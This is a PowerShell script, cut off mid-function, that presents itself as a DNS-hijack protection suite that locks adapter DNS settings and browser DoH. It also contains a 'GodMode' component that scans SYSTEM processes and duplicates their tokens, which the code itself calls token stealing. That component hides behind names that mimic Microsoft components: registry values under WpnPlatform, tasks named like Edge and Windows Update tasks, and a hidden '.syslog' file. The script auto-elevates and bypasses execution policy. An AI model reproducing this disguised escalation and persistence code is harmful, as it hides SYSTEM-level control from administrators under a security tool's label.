<#
.SYNOPSIS
    Enterprise DNS Hijack Protection & Installer Suite (IPv4 & IPv6 + DoH)
.DESCRIPTION
    A highly verbose, enterprise-grade PowerShell tool that enforces a Zero-Trust 
    Registry padlock on network interface DNS configurations and closes browser DoH loopholes.
    
    NEW FEATURES:
    - Global CLI: Installs 'dnslock' command to Windows PATH for easy cmd access.
    - Automated Installation: Creates a Scheduled Task to re-apply locks automatically on boot/network change.
    - Background Service: Protects against Windows Updates and driver reinstalls.
    - Advanced Auditing: UI now tracks active GPO enforcement and Installation status.
    - Payload Self-Defense: NTFS ACL hardening locks the installation directory against tampering.
#>

param (
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Lock,
    [switch]$Unlock,
    [switch]$SilentLock,
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$GodModeStatus,
    [switch]$Launch,
    [switch]$Verbose,
    [switch]$InstallGodMode,
    [switch]$UninstallGodMode,
    [switch]$DumpLogs,
    [switch]$ExportElevationDiagnostics,
    [switch]$ElevateAllProcesses,
    [switch]$SystemDesktop,
    [switch]$InstallSystemDesktop,
    [switch]$UninstallSystemDesktop,
    [switch]$DebugMode
)

# ============================================================================
# 0. EXECUTION POLICY AUTO-SET
# ============================================================================
try {
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
} catch {
    # Policy may already be set or restricted by GPO; continue silently
}

# ============================================================================
# 0.5 POWERSHELL 7 PREFERRED LAUNCHER
# ============================================================================
if ($PSVersionTable.PSVersion.Major -le 5) {
    $Pwsh7 = Get-Command -Name pwsh -CommandType Application -ErrorAction SilentlyContinue
    if ($Pwsh7) {
        $ArgList = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"")
        $Bound = $PSBoundParameters.GetEnumerator() | ForEach-Object {
            if ($_.Value -is [switch] -and $_.Value.IsPresent) {
                "-$($_.Key)"
            }
        }
        if ($Bound) { $ArgList += $Bound }
        Start-Process -FilePath $Pwsh7.Source -ArgumentList $ArgList -Wait -NoNewWindow
        Exit
    }
}

# ============================================================================
# 1. AUTO-ELEVATION & PRE-FLIGHT CHECKS
# ============================================================================

# Automatically relaunch as Administrator if not already elevated
$Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$Role = [Security.Principal.WindowsBuiltInRole]::Administrator
if (-not $Principal.IsInRole($Role)) {
    if ($Install -or $Uninstall -or $Lock -or $Unlock -or $SilentLock) {
        Write-Warning "CRITICAL: Administrative privileges required for CLI commands. Access Denied."
        Exit
    }
    Write-Warning "Administrative privileges required. Attempting auto-elevation..."
    Start-Sleep -Seconds 1
    try {
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName = (Get-Process -Id $PID).Path
        
        # Forward any CLI flags (like -Uninstall) to the elevated process
        $ArgsString = ""
        if ($Install) { $ArgsString += " -Install" }
        if ($Uninstall) { $ArgsString += " -Uninstall" }
        if ($Lock) { $ArgsString += " -Lock" }
        if ($Unlock) { $ArgsString += " -Unlock" }
        if ($SilentLock) { $ArgsString += " -SilentLock" }
        if ($DebugMode) { $ArgsString += " -DebugMode" }
        if ($Verbose) { $ArgsString += " -Verbose" }
        if ($ExportElevationDiagnostics) { $ArgsString += " -ExportElevationDiagnostics" }
        if ($ElevateAllProcesses) { $ArgsString += " -ElevateAllProcesses" }

        $ProcessInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $ArgsString"
        $ProcessInfo.Verb = "runAs"
        $ProcessInfo.UseShellExecute = $true
        [System.Diagnostics.Process]::Start($ProcessInfo) | Out-Null
        Exit
    } catch {
        Write-Error "Failed to elevate. Please right-click and 'Run as Administrator'."
        Pause
        Exit
    }
}

# Define Installation Paths
$InstallDir = "C:\ProgramData\DNSGuard"
$InstallScript = Join-Path -Path $InstallDir -ChildPath "DNS_Lockdown.ps1"
$CmdPath = "C:\Windows\dnslock.cmd"
$TaskName = "DNS-Hijack-Guard"

# Setup Auto-Logging in the same directory as the script
$ScriptDir = Split-Path -Parent -Path $PSCommandPath
if (-not $ScriptDir) { $ScriptDir = $PWD.Path }
# Log to a writable location (not the hardened install dir) so admin can still write
$LogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.log"
$DebugLogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.debug.log"

$GodModeFlagRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
$GodModeFlagRegName = "GodModeActive"
$GodModeLogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$GodModeTaskPrefix = "MicrosoftEdgeUpdateTask_"

$GodModeInstallDir     = "C:\ProgramData\GodMode"
$GodModeInstallScript  = Join-Path -Path $GodModeInstallDir -ChildPath "GodMode.ps1"
$GodModeCmdPath        = "C:\Windows\godmode.cmd"
$GodModeTaskName       = "Windows-Update-Health-Monitor"
$GodModeGuardianName   = "Windows-Update-Health-Check"

# Raw debug dump rotation settings
$RawDumpDir = Join-Path $env:TEMP "GodMode_RawDumps"
$MaxRawDumps = 5

function Write-Log {
    param ([string]$Message, [string]$Type = "INFO", [ConsoleColor]$Color = "White")
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try { "[$TimeStamp] [$Type] $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
    
    # Only print to screen if we are NOT running silently in the background
    if (-not $SilentLock) {
        Write-Host "[$Type] $Message" -ForegroundColor $Color
    }
}

function Write-DebugLog {
    param (
        [string]$FunctionName,
        [string]$Action = "ENTRY", # ENTRY, EXIT, ERROR, WARN, INFO
        [string]$Message = "",
        [System.Management.Automation.ErrorRecord]$ErrorRecord = $null,
        [string]$RootCause = ""
    )
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = $MyInvocation.ScriptLineNumber
    try {
        $Detail = "[$TimeStamp] [DEBUG] [$Action] [$FunctionName] [$Line] $Message"
        if ($ErrorRecord) {
            $Stack = $ErrorRecord.ScriptStackTrace -replace "`r`n", " | "
            $Detail += " | Exception: $($ErrorRecord.Exception.Message) | Stack: $Stack"
            if (-not $RootCause) {
                $exMsg = $ErrorRecord.Exception.Message
                if ($exMsg -match "Access is denied" -or $exMsg -match "0x5" -or $exMsg -match "error 5") {
                    $RootCause = "Access Denied. Likely causes: PPL protection on target process, missing SeDebugPrivilege, UAC token filtering removing admin rights, or wrong access mask."
                } elseif ($exMsg -match "0x57" -or $exMsg -match "invalid parameter" -or $exMsg -match "87") {
                    $RootCause = "Invalid parameter. Likely causes: malformed STARTUPINFO, wrong desktop name (must be WinSta0\Default), or invalid creation flags."
                } elseif ($exMsg -match "privilege" -or $exMsg -match "1314") {
                    $RootCause = "Privilege not held. The current process token lacks SeDebugPrivilege, SeAssignPrimaryTokenPrivilege, or SeImpersonatePrivilege. Run as Administrator or SYSTEM."
                }
            }
        }
        if ($RootCause) {
            $Detail += " | ROOT_CAUSE: $RootCause"
        }
        $Detail | Out-File -FilePath $DebugLogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
        # Also mirror to main log if DebugMode is enabled
        if ($DebugMode -or $Verbose) {
            $Detail | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Invoke-WithDebug {
    param (
        [string]$FunctionName,
        [scriptblock]$ScriptBlock
    )
    Write-DebugLog -FunctionName $FunctionName -Action "ENTRY"
    try {
        $Result = & $ScriptBlock
        Write-DebugLog -FunctionName $FunctionName -Action "EXIT" -Message "Success"
        return $Result
    } catch {
        $ErrorRecord = $_
        Write-DebugLog -FunctionName $FunctionName -Action "ERROR" -Message "Exception occurred" -ErrorRecord $ErrorRecord
        Write-Log -Message "[$FunctionName] Error: $($ErrorRecord.Exception.Message)" -Type "ERROR" -Color Red
        throw $ErrorRecord
    }
}

function Export-RawDebugDump {
    param(
        [string]$Trigger = "Manual",
        [string]$DumpDir = $RawDumpDir,
        [int]$KeepCount = $MaxRawDumps
    )
    try {
        if (-not (Test-Path $DumpDir)) { New-Item -ItemType Directory -Path $DumpDir -Force | Out-Null }
        # Rotate: keep only $KeepCount most recent dumps
        Get-ChildItem -Path $DumpDir -Filter "GodMode_RawDump_*.log" -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending |
            Select-Object -Skip $KeepCount |
            Remove-Item -Force -ErrorAction SilentlyContinue
        $Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
        $DumpFile = Join-Path $DumpDir "GodMode_RawDump_${Timestamp}_${Trigger}.log"
        $Dump = @()
        $Dump += "===== GOD MODE RAW DEBUG DUMP ====="
        $Dump += "Trigger: $Trigger"
        $Dump += "Generated: $(Get-Date)"
        $Dump += "Script: $PSCommandPath"
        $Dump += "PID: $PID"
        $Dump += "PSVersion: $($PSVersionTable.PSVersion)"
        $Dump += "PSPath: $($PSHome)"
        $Dump += "OS: $((Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption)"
        $Dump += "User: $([Environment]::UserName)"
        $Dump += "Computer: $([Environment]::MachineName)"
        $Dump += "IsAdmin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
        $Dump += "IsBuiltInAdmin: $(([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -like '*-500'))"
        $Dump += ""
        $Dump += "===== ENVIRONMENT VARIABLES ====="
        $Dump += (Get-ChildItem Env: -ErrorAction SilentlyContinue | Select-Object Name, Value | Out-String)
        $Dump += ""
        $Dump += "===== LOADED MODULES ====="
        $Dump += (Get-Module | Select-Object Name, Version, Path | Out-String)
        $Dump += ""
        $Dump += "===== RUNNING PROCESSES (Top 20) ====="
        $Dump += (Get-Process -ErrorAction SilentlyContinue | Sort-Object CPU -Descending | Select-Object -First 20 | Out-String)
        $Dump += ""
        $Dump += "===== `$ERROR VARIABLE (Last 20) ====="
        if ($Error.Count -gt 0) {
            $Dump += ($Error | Select-Object -First 20 | ForEach-Object {
                "Exception: $($_.Exception.Message)`nStackTrace: $($_.ScriptStackTrace)`nCategory: $($_.CategoryInfo)`n---"
            } | Out-String)
        } else {
            $Dump += '[No errors in $Error]'
        }
        $Dump += ""
        $Dump += "===== MAIN LOG ====="
        if (Test-Path $LogFile) { $Dump += (Get-Content -Raw $LogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No main log]' }
        $Dump += ""
        $Dump += "===== DEBUG LOG ====="
        if (Test-Path $DebugLogFile) { $Dump += (Get-Content -Raw $DebugLogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No debug log]' }
        $Dump += ""
        $Dump += "===== GOD MODE LOG ====="
        if (Test-Path $GodModeLogFile) { $Dump += (Get-Content -Raw $GodModeLogFile -ErrorAction SilentlyContinue) } else { $Dump += '[No GodMode log]' }
        $Dump += ""
        $Dump += "===== RAW DUMP COMPLETE ====="
        $Dump -join "`r`n" | Out-File -FilePath $DumpFile -Encoding UTF8 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Raw debug dump created: $DumpFile" -Type "DEBUG" -Color Gray
        return $DumpFile
    } catch {
        Write-Log -Message "Failed to create raw debug dump: $_" -Type "ERROR" -Color Red
        return $null
    }
}

# ============================================================================
# 1a. ADVANCED ELEVATION DIAGNOSTICS & ROOT-CAUSE ERROR MAPPING
# ============================================================================

function Get-Win32ErrorRootCause {
    param(
        [int]$ErrorCode,
        [string]$Context = "general"
    )
    $baseMsg = ([ComponentModel.Win32Exception]$ErrorCode).Message
    $rootCause = switch ($ErrorCode) {
        5 {
            $ctx = switch ($Context) {
                "OpenProcess" { "The target process is likely protected by Protected Process Light (PPL) or runs in a higher integrity level. Current token may lack SeDebugPrivilege, or the access mask is rejected. Mitigation: use PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and pick a non-PPL SYSTEM process (winlogon.exe, dwm.exe in Session 1)." }
                "OpenProcessToken" { "Token query access denied. The target process is protected (PPL) or the current token does not have the required privilege. Try a different SYSTEM process." }
                "DuplicateTokenEx" { "Token duplication denied. The source token may be restricted, filtered, or the current process lacks SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege." }
                "CreateProcessWithTokenW" { "Process creation denied. The duplicated token may not have the correct Session ID / WindowStation (WinSta0\Default) for interactive desktop apps. Ensure the source process is in Session 1." }
                default { "Access Denied. Most likely causes: (1) PPL protection on target process, (2) missing SeDebugPrivilege, (3) wrong access mask, (4) integrity level mismatch." }
            }
            "ERROR_ACCESS_DENIED ($baseMsg) | Root cause: $ctx"
        }
        87 {
            "ERROR_INVALID_PARAMETER ($baseMsg). Root cause: a structure field, desktop name, or creation flag is wrong. Verify STARTUPINFO.cb = sizeof(STARTUPINFO), lpDesktop = 'WinSta0\Default', and creation flags are valid."
        }
        6 {
            "ERROR_INVALID_HANDLE ($baseMsg). Root cause: a handle was closed prematurely, is stale, or was never opened. Check that CloseHandle is not called before the handle is used."
        }
        1314 {
            "ERROR_PRIVILEGE_NOT_HELD ($baseMsg). Root cause: the current process token does not hold the required privilege (SeDebugPrivilege, SeAssignPrimaryTokenPrivilege, or SeImpersonatePrivilege). Run as Administrator and ensure Enable-ElevationPrivileges succeeds first."
        }
        1307 {
            "ERROR_INVALID_OWNER ($baseMsg). Root cause: the duplicated token cannot be assigned as the primary token of a new process. The token may be an identification token instead of an impersonation/primary token."
        }
        2 {
            "ERROR_FILE_NOT_FOUND ($baseMsg). Root cause: the executable path passed to CreateProcessWithTokenW does not exist or is not accessible from the SYSTEM token context."
        }
        8 {
            "ERROR_NOT_ENOUGH_MEMORY ($baseMsg). Root cause: system is low on memory or the token/process handle table is exhausted."
        }
        998 {
            "ERROR_NOACCESS ($baseMsg). Root cause: invalid pointer or memory access. A handle pointer may be null or point to freed memory."
        }
        122 {
            "ERROR_INSUFFICIENT_BUFFER ($baseMsg). Root cause: a buffer passed to a Win32 API was too small. Usually not applicable to token ops; check privilege structure sizes."
        }
        1300 {
            "ERROR_NOT_ALL_ASSIGNED ($baseMsg). Root cause: the current process token holds the privilege name but it is disabled or not fully assigned. Typical when running as Administrator (filtered token) rather than SYSTEM. Token stealing may still work if SeImpersonatePrivilege is present; SeAssignPrimaryTokenPrivilege is strictly required only for CreateProcessWithTokenW with a primary token. If this is the only missing privilege, try using an impersonation token path instead."
        }
        default {
            "Win32 error $ErrorCode ($baseMsg). No specific root cause mapped; treat as generic API failure."
        }
    }
    return $rootCause
}

function Get-ElevationPrivilegeStatus {
    $results = @()
    $privNames = @(
        "SeDebugPrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeImpersonatePrivilege",
        "SeTcbPrivilege",
        "SeIncreaseQuotaPrivilege",
        "SeLoadDriverPrivilege"
    )
    foreach ($privName in $privNames) {
        $enabled = $false
        try {
            $enabled = [TokenOps]::EnablePrivilege($privName)
        } catch {
            $enabled = $false
        }
        $results += [PSCustomObject]@{
            Privilege = $privName
            Enabled = $enabled
            Required = ($privName -in @("SeDebugPrivilege","SeAssignPrimaryTokenPrivilege","SeImpersonatePrivilege"))
        }
    }
    $missing = ($results | Where-Object { $_.Required -and -not $_.Enabled }).Privilege -join ", "
    $diagnostics = "Current token elevation privilege diagnostics: "
    if ($missing) {
        $diagnostics += "MISSING REQUIRED PRIVILEGES: $missing. These are mandatory for token stealing. If you are Administrator but not SYSTEM, SeDebugPrivilege may be removed by UAC token filtering. Use a fully elevated (RunAsAdmin) shell or SYSTEM shell."
    } else {
        $diagnostics += "All required privileges are present. If token stealing still fails, look for PPL protection or Session/WindowStation mismatch."
    }
    Write-DebugLog -FunctionName "Get-ElevationPrivilegeStatus" -Action "INFO" -Message $diagnostics
    return $results
}

function Get-ProcessElevationContext {
    param([int]$ProcessId)
    $context = [PSCustomObject]@{
        PID = $ProcessId
        Name = "Unknown"
        SessionId = -1
        Owner = "Unknown"
        IsSystem = $false
        CanOpen = $false
        CanQueryToken = $false
        CanDuplicate = $false
        RootCause = ""
        Recommend = ""
    }
    try {
        $proc = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
        if ($proc) { $context.Name = $proc.Name }
    } catch {}
    try {
        $wmi = Get-CimInstance Win32_Process -Filter "ProcessId=$ProcessId" -ErrorAction SilentlyContinue
        if ($wmi) {
            $context.SessionId = $wmi.SessionId
            try {
                $owner = ($wmi | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                $context.Owner = $owner
                $context.IsSystem = ($owner -eq "SYSTEM")
            } catch {}
        }
    } catch {}
    if ($context.IsSystem) {
        $hProc = [TokenOps]::OpenProcess([TokenOps]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $ProcessId)
        if ($hProc -eq [IntPtr]::Zero) {
            $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $context.CanOpen = $false
            $context.RootCause = "OpenProcess failed: $(Get-Win32ErrorRootCause -ErrorCode $err -Context 'OpenProcess')"
            $context.Recommend = "This process is protected (likely PPL). Do NOT use it as token source. Pick a Session 1 SYSTEM process like winlogon.exe or dwm.exe."
        } else {
            $context.CanOpen = $true
            try {
                $hToken = [IntPtr]::Zero
                if ([TokenOps]::OpenProcessToken($hProc, [TokenOps]::TOKEN_DUPLICATE -bor [TokenOps]::TOKEN_QUERY, [ref]$hToken)) {
                    $context.CanQueryToken = $true
                    try {
                        $hDup = [IntPtr]::Zero
                        if ([TokenOps]::DuplicateTokenEx($hToken, [TokenOps]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, [TokenOps]::SecurityImpersonation, [TokenOps]::TokenPrimary, [ref]$hDup)) {
                            $context.CanDuplicate = $true
                            [TokenOps]::CloseHandle($hDup)
                        } else {
                            $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            $context.CanDuplicate = $false
                            $context.RootCause = "DuplicateTokenEx failed: $(Get-Win32ErrorRootCause -ErrorCode $err -Context 'DuplicateTokenEx')"
                            $context.Recommend = "Token is restricted or filtered. Try a different SYSTEM process."
                        }
                    } finally {
                        [TokenOps]::CloseHandle($hToken)
                    }
                } else {
                    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    $context.CanQueryToken = $false
                    $context.RootCause = "OpenProcessToken failed: $(Get-Win32ErrorRootCause -ErrorCode $err -Context 'OpenProcessToken')"
                    $context.Recommend = "Process token is protected. Try a different SYSTEM process."
                }
            } finally {
                [TokenOps]::CloseHandle($hProc)
            }
        }
    } else {
        $context.RootCause = "Not a SYSTEM process. Owner = $($context.Owner)"
        $context.Recommend = "Only SYSTEM processes can be used as token source."
    }
    return $context
}

function Export-ElevationDiagnostics {
    param(
        [string]$Trigger = "Auto",
        [string]$DestinationFolder = [Environment]::GetFolderPath("Desktop")
    )
    $dump = @()
    $dump += "===== ELEVATION DIAGNOSTICS DUMP ====="
    $dump += "Trigger: $Trigger"
    $dump += "Timestamp: $(Get-Date)"
    $dump += "Script PID: $PID"
    $dump += "User: $([Environment]::UserName)"
    $dump += "IsAdmin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
    $dump += "IsBuiltInAdmin: $(([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -like '*-500'))"
    $dump += ""
    $dump += "----- PRIVILEGE STATUS -----"
    $privStatus = Get-ElevationPrivilegeStatus
    $dump += ($privStatus | Format-Table -AutoSize | Out-String)
    $dump += ""
    $dump += "----- SYSTEM PROCESSES (Top 40) -----"
    $sysProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessId -gt 4 } | Sort-Object SessionId -Descending | Select-Object -First 40
    foreach ($sp in $sysProcs) {
        $ctx = Get-ProcessElevationContext -ProcessId $sp.ProcessId
        $dump += "PID=$($ctx.PID) Name=$($ctx.Name) Session=$($ctx.SessionId) Owner=$($ctx.Owner) CanOpen=$($ctx.CanOpen) CanQuery=$($ctx.CanQueryToken) CanDup=$($ctx.CanDuplicate) IsSystem=$($ctx.IsSystem)"
        if ($ctx.RootCause) { $dump += "  -> RootCause: $($ctx.RootCause)" }
        if ($ctx.Recommend) { $dump += "  -> Recommend: $($ctx.Recommend)" }
    }
    $dump += ""
    $dump += "----- LAST WIN32 ERRORS (session) -----"
    $lastErr = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    if ($lastErr -ne 0) {
        $dump += "Last Win32 error in this thread: $lastErr -> $(Get-Win32ErrorRootCause -ErrorCode $lastErr)"
    } else {
        $dump += "No pending Win32 error in this thread."
    }
    $dump += ""
    $dump += "----- END ELEVATION DIAGNOSTICS -----"
    $dumpPath = Join-Path $DestinationFolder "GodMode_ElevationDiagnostics_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').log"
    $dump -join "`r`n" | Out-File -FilePath $dumpPath -Encoding UTF8 -Force
    Write-Log -Message "Elevation diagnostics exported to: $dumpPath" -Type "DEBUG" -Color Gray
    Write-DebugLog -FunctionName "Export-ElevationDiagnostics" -Action "INFO" -Message "Dump written to $dumpPath"
    return $dumpPath
}

# Global uncaught error trap: dump raw debug state and log, then break
trap {
    Export-RawDebugDump -Trigger "UNCAUGHT_TRAP"
    Write-Log -Message "UNCAUGHT TRAP: $($_.Exception.Message) | Stack: $($_.ScriptStackTrace)" -Type "ERROR" -Color Red
    break
}

if (-not $SilentLock) { Write-Log -Message "Enterprise Diagnostics Suite Initialized." -Type "SYSTEM" -Color Cyan }

# ============================================================================
# 2. SYSTEM AUDIT & HARDWARE DISCOVERY
# ============================================================================

function Run-SystemAudit {
    Write-Log -Message "Running Pre-Flight System Audit..." -Type "AUDIT" -Color DarkGray
    $OS = Get-CimInstance Win32_OperatingSystem
    Write-Log -Message "OS Version: $($OS.Caption) (Build $($OS.BuildNumber))" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "PS Version: $($PSVersionTable.PSVersion)" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "Execution Path: $ScriptDir" -Type "AUDIT" -Color DarkGray
}

if (-not $SilentLock) { Run-SystemAudit }

# Fetch all network adapters (excluding hidden virtual ones if possible, but keeping all physical)
$Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue } # Fallback

$SidAdmin = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
$SidSystem = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
$SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
# Network UI restrictions are USER policies (HKCU) -- they gray out the adapter properties UI
$GpoPath = "HKCU:\Software\Policies\Microsoft\Windows\Network Connections"

# Define Browser DoH GPO Paths
$EdgePath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
$ChromePath = "HKLM:\SOFTWARE\Policies\Google\Chrome"
$FirefoxPath = "HKLM:\SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

# ============================================================================
# 3. STATUS CHECKER MODULE (ENHANCED UI)
# ============================================================================

function Get-DNSLockStatus {
    $AllLocked = $true
    $AnyLocked = $false

    # Refresh adapter list each time (USB/Wi-Fi may change while menu is open)
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }

    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " LIVE HARDWARE ADAPTER STATUS " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # --- 1. CHECK HARDWARE ADAPTERS ---
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $AdapterLocked = $false
        $StatusColor = if ($Adapter.Status -eq "Up") { "Green" } else { "DarkGray" }

        # Display Hardware Data
        Write-Host ("  Hardware: {0,-25} | State: {1,-5} | MAC: {2}" -f $Adapter.Name, $Adapter.Status, $Adapter.MacAddress) -ForegroundColor $StatusColor

        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") {
                                $AdapterLocked = $true
                            }
                        } catch {} 
                    }
                    $RegKey.Close()
                }
            } catch {}
        }

        # Visual Output Logic
        if ($AdapterLocked) {
            Write-Host "  `-> Security: [X] LOCKED (IPv4/IPv6)" -ForegroundColor Red
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AnyLocked = $true
        } else {
            Write-Host "  `-> Security: [ ] UNLOCKED (Vulnerable)" -ForegroundColor Green
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AllLocked = $false
        }
    }

    # --- 2. CHECK SYSTEM POLICIES & INSTALLATION ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " SYSTEM POLICIES & PERSISTENCE " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # Check Real-Time GPO Enforcement (each policy checked independently)
    $GpoEnforced = $true

    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $GpoEnforced = $false }

    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $GpoEnforced = $false }

    if ($GpoEnforced) {
        Write-Host "  [X] GPO Restrictions   -> ENFORCED (Browsers & GUI)" -ForegroundColor Red
    } else {
        Write-Host "  [ ] GPO Restrictions   -> NOT ENFORCED" -ForegroundColor Green
        $AllLocked = $false # System isn't fully secure if GPOs are missing
    }

    # Check Service Installation Status
    $TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    $CmdExists = Test-Path $CmdPath

    if ($TaskExists -and $CmdExists) {
        Write-Host "  [X] Background Service -> INSTALLED ('dnslock' active)" -ForegroundColor Cyan
    } else {
        Write-Host "  [ ] Background Service -> NOT INSTALLED" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # --- 3. INTEGRITY CHECK ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " INTEGRITY CHECK " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray
    if (Test-Path $InstallScript) {
        $ExpectedHash = $null
        try { $ExpectedHash = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings" -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
        if (-not $ExpectedHash -and (Test-Path (Join-Path $InstallDir "integrity.sha256"))) {
            $ExpectedHash = Get-Content -Path (Join-Path $InstallDir "integrity.sha256") -Raw
        }
        if ($ExpectedHash) {
            $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
            if ($ExpectedHash.Trim() -eq $ActualHash.Trim()) {
                Write-Host "  [X] Script Integrity    -> VERIFIED" -ForegroundColor Green
            } else {
                Write-Host "  [ ] Script Integrity    -> TAMPER DETECTED" -ForegroundColor Red
                Write-Host "`n  >>> TAMPER DETECTED! ACTION REQUIRED <<<" -ForegroundColor Black -BackgroundColor Yellow
                Write-Host "  - Run a full antivirus scan immediately." -ForegroundColor Yellow
                Write-Host "  - Do NOT use options [1] or [2] (they may run malicious code)." -ForegroundColor Yellow
                Write-Host "  - Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
                Write-Host "`n  HOW TO CHECK FOR MALICIOUS TASKS:" -ForegroundColor Cyan
                Write-Host "  1. Press Win + R, type: taskschd.msc  (press Enter)" -ForegroundColor White
                Write-Host "  2. Click 'Task Scheduler Library' on the left" -ForegroundColor White
                Write-Host "  3. Look for tasks you don't recognize (sort by Author)" -ForegroundColor White
                Write-Host "  4. Double-click suspicious tasks, check the 'Actions' tab" -ForegroundColor White
                Write-Host "  5. Delete anything running powershell/cmd from weird paths" -ForegroundColor White
                Write-Host "`n  QUICK POWERShell CHECK (run as admin):" -ForegroundColor Cyan
                Write-Host "  Get-ScheduledTask | Where-Object {`$_.TaskPath -eq '\' -and `$_.Author -notmatch 'Microsoft'} | Select-Object TaskName, Author, State" -ForegroundColor White
            }
        } else {
            Write-Host "  [ ] Script Integrity    -> NO BASELINE" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "  [ ] Script Integrity    -> NOT INSTALLED" -ForegroundColor DarkGray
    }
